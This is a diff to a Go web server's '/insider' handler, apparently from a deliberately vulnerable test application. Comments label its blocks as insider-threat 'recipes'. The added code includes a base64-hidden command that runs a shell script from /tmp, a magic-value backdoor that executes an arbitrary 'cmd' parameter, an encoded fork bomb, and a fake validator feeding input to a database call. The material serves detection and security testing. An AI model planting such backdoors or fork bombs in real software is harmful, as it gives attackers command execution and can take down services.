@@ -71,35 +71,45 @@ func execHandler(w http.ResponseWriter, r *http.Request) {
 
 // /insider
 func insiderHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method == "GET" {
+		q := r.URL.Query()
+		// RECIPE: Time Bomb pattern
+		command := "c2ggL3RtcC9zaGVsbGNvZGUuc2g="
+		cmd, _ := base64.StdEncoding.DecodeString(command)
+		ticking(string(cmd))
+		// RECIPE: Magic Value leading to command injection
 
-	// RECIPE: Time Bomb pattern
-	command := "c2ggL3RtcC9zaGVsbGNvZGUuc2g="
-	cmd, _ := base64.StdEncoding.DecodeString(command)
-	ticking(string(cmd))
-	// RECIPE: Magic Value leading to command injection
-	if r.Method == "POST" {
-		input := r.FormValue("tracefn")
+		input := q.Get("tracefn")
 		if input == "C4A938B6FE01E" {
 			execCmd(r.FormValue("cmd"))
 		}
-	}
 
-	// RECIPE: Compiler Abuse Pattern
+		// RECIPE: Compiler Abuse Pattern
+		//don't know how to do in go
+		// RECIPE: Abuse Class Loader pattern (attacker controlled)
+		// no class in go
 
-	// RECIPE: Abuse Class Loader pattern (attacker controlled)
-
-	// RECIPE: Execute a Fork Bomb and DDOS the host
-	inPlainSight := "Oigpezp8OiZ9Ozo="
-	fb, _ := base64.StdEncoding.DecodeString(inPlainSight)
-	if r.Method == "POST" {
-		input := r.FormValue("tracefn")
+		// RECIPE: Execute a Fork Bomb and DDOS the host
+		inPlainSight := "Oigpezp8OiZ9Ozo="
+		fb, _ := base64.StdEncoding.DecodeString(inPlainSight)
 		if input == "ddos" {
 			go execCmd("sh -c " + string(fb))
 		}
+
+		// RECIPE: Escape validation framework
+		untrusted := q.Get("x")
+		x := base64.StdEncoding.EncodeToString([]byte(untrusted))
+		validatedString := validate(x)
+
+		if len(validatedString) > 0 {
+			y, _ := base64.StdEncoding.DecodeString(validatedString)
+			ys := string(y)
+
+			if !dbExec(ys) {
+				log.Println("Validation problem with " + x)
+			}
+		}
 	}
-
-	// RECIPE: Escape validation framework
-
 }
 
 //Time bomb
@@ -113,6 +123,13 @@ func ticking(parameter string) {
 		return
 	}
 	execCmd(string(data))
+}
+
+func validate(value string) string {
+	if strings.Contains(value, "SOMETHING_HERE") {
+		return value
+	}
+	return ""
 }
 
 func execCmd(input string) error {
